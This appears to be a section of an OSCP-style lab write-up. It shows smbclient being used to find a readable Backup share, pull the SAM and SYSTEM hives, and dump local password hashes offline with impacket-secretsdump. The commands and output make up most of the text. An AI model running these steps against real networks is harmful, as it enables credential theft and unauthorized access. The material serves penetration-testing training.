# 07 — The `Backup` share on the second server

The first pass stopped at a wall that was not a wall. BloodHound was clear about the shape of the
path — `A.NEWMAN` can force a password change on `A.BETTY`, and `A.BETTY` is Domain Admin — but the
credential that does it was not on `WS26`. The other half of the path was on the second server: the
same shares were enumerated again later, with one small difference, and it opened.

## 7.1 The difference that mattered

The first attempt was a share listing without a domain in the credential string. It authenticated,
listed almost nothing and looked like a dead end:

```bash
smbclient -L //172.16.97.202 -U 'p.andrew%[redacted]'
```

The second attempt spells the domain out in the `-U` value, and the same account sees the share that
matters:

```bash
smbclient -L //172.16.97.202 -U 'oscp.exam/p.andrew%[redacted]'
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backup          Disk      System Backups
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 172.16.97.202 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

That is the lesson of this box in one line: on a one-domain network the domain prefix *should* be
redundant, and here it is not. `Backup` — comment `System Backups` — is the share that the whole set
was built around.

## 7.2 Inside the share

```bash
smbclient //172.16.97.202/Backup -U 'oscp.exam/p.andrew%[redacted]'
```

```text
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jan 22 11:40:11 2026
  ..                                  D        0  Tue Jul 21 16:27:09 2026
  SystemBackup                        D        0  Wed Feb  4 18:18:42 2026

                42885120 blocks of size 4096. 14881285 blocks available
```

A single directory, and the name says exactly what is in it. The files are pulled in one pass rather
than one by one, because `smbclient` can mirror a tree with tar semantics:

```text
smb: \> tarmode
tarmode is now full, system, hidden, nonroot, noacls
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \SystemBackup\SAM of size 49152 as SystemBackup/SAM (136.4 KiloBytes/sec) ...
getting file \SystemBackup\SYSTEM of size 13115392 as SystemBackup/SYSTEM (178.6 KiloBytes/sec)
smb: \> exit
```

`SAM` and `SYSTEM` together — the two hives that are useless apart and complete together. `SYSTEM`
carries the boot key, `SAM` carries the hashes, and `impacket-secretsdump` wants both. This is a
system-state backup of a Windows machine sitting on a share that a normal domain user can read.

## 7.3 Offline extraction of the local hashes

Everything happens locally; the target is never touched again:

```bash
cd SystemBackup
sudo impacket-secretsdump -sam SAM -system SYSTEM local
```

```text
Impacket v0.12.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: [redacted]
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[redacted]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Three things are worth reading out of that block:

| Line | Meaning |
|---|---|
| `Administrator:500` | the built-in local administrator of the machine that produced the backup |
| `aad3b435b51404ee...` + `[redacted]` | an NT hash with the LM half empty, i.e. a modern password |
| `31d6cfe0d16ae931b73c59d7e0c089c0` | the NT hash of an empty password — `Guest` and `DefaultAccount` are simply disabled |

The `Administrator` NT hash is the object of the exercise. It is a local credential, so it does not
open the domain by itself. What it does open is the machine the backup came from — which is the host
the first pass could never enter.
